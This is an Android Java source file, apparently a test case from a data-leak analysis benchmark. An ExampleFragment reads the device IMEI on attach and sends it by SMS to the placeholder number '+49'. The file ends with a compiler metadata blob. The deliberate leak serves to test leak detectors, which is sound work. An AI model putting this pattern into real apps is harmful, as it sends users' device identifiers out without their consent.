package de.ecspride;

import android.app.Activity;
import android.app.Fragment;
import android.os.Bundle;
import android.telephony.SmsManager;

public class ExampleFragment extends Fragment {
    private static String imei = null;
    
    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, imei, null, null);
    }
    
    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);
        imei = MainActivity.imei;
    }
    
    public ExampleFragment() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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");
}
